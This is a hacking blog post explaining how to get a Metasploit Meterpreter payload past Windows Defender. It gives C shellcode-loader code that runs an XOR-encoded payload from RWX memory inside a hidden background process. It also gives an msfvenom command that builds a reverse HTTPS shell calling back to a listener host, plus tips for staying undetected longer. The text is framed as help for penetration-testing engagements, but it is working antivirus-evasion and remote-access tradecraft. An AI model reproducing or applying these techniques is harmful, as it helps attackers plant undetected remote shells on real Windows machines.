Windows Defender Bypassing For Meterpreter
27.01.2020 by HackerHouse

If you have done any kind of hacking against Windows enterprise environments lately, you will have noticed that the detection routines of Microsoft Defender have been improving significantly. Many common anti-malware scan interface (AMSI) bypass tricks are now trivially detected and it can be quite difficult for an inexperienced hacker to get a payload running. I recently had to bypass Windows Defender running on a Windows 10 Enterprise host and this blog post documents the result, a rather simple way of evading Defender. It used to be the case that generating a “meterpreter” payload using “msfvenom” as PowerShell or similar scripted output would permit you to load your code directly onto a Windows host with little effort, or using a PE with strong encoders then injected with another binary using Shellter. However, that has now changed with AMSI being able to detect most garden variety scripted payloads and msfvenom generated binaries mostly being detected by Defender. Windows Defender isn’t entirely fool proof however and it takes little work to bypass the detection routines through use of native code loaded from a DLL. We created a shellcode loading harness Peony[0] that implements the bypass described here and can be used with x86 and x64 meterpreter payloads rather generically to defeat Windows Defender. The project creates a console application Loader.exe which has one main purpose, to load Payload.dll into memory and hide the application’s console Window. This application then quietly sits in the background, invisible to the user and runs in an infinite loop allowing our Payload routines to complete.

HMODULE PayloadDLL;
PayloadDLL = LoadLibrary(L"Payload.dll");

The Payload.dll is responsible for taking a “msfvenom” generated payload, mapping it into read, write and executable memory then transferring execution flow to the position independent shellcode to load meterpreter onto the host. It does this by first creating a thread inside the DllMain function which is called when the DLL is loaded into memory by the Loader. Once inside our thread we map a page of memory the same size as our shellcode. We copy our shellcode into this newly mapped memory and execute it directly as a function. The code is similar to the following.

pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(pShellcode, shellcode, sizeof(shellcode)-1);
int (*func)();
func = (int (*)()) pShellcode;
(*func)();

If you generate a Payload.dll containing a trivial to detect Windows shellcode (such as an entirely unencoded or unencrypted payload) then Windows Defender will certainly identify your DLL as malicious and quarantine the file. As such you must still encode your shellcode that will be loaded from the DLL to ensure that it bypasses signature based detection. Metasploit version 5 now supports generating encrypted payloads using msfvenom, supplying the “–encrypt” option allows to create a payload encrypted with RC4, AES256 or encoded output using Base64 or XOR. It transpires that simply XOR encoding your payload routine is sufficient and using the built-in “x86/xor_dynamic” encoder is all that is needed to generate a signature-free DLL. Despite Windows Defender offering significant improved detection lately for common routines and generated binaries, it is still trivial to bypass and offers little protection against meterpreter. You can use our Peony solution which contains both a Loader project and Payload project for compiling a generic meterpreter bypassing payload for use on engagements, however it is likely that this will become detected in the near future and as such a variation of this should be adapted for your own uses. We highly recommend making use of Windows CryptoAPI and using an AES256 encrypted payload to further deter detection of shellcode within a payload.dll, left as an exercise to the reader, however XOR seems wholly sufficient at present. As an example the following msfvenom command can be used to generate a payload and then replace the shellcode variable in Payload.cpp with your own payload.c buf entry. You will need Visual Studio to compile the project files.

msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.10.2 LPORT=443 --encoder x86/xor_dynamic -f c -o payload.c

Windows Defender will often send suspicious samples to the cloud for detection and any generated files will have a limited shelf-life especially if you use meterpreter’s advanced features, however simply adjusting the technique to add better encryption or using timers to force timeouts can help prevent this (see commented code for examples). Ultimately, any payload generated using the sample project here should not expect to last long but can be used as a starting point for your own methods of loading meterpreter onto a Windows Defender protected host. Some of the concepts here are outlined in a blog post by Wei Chen over at the Rapid7 blog[1]. Happy Hacking!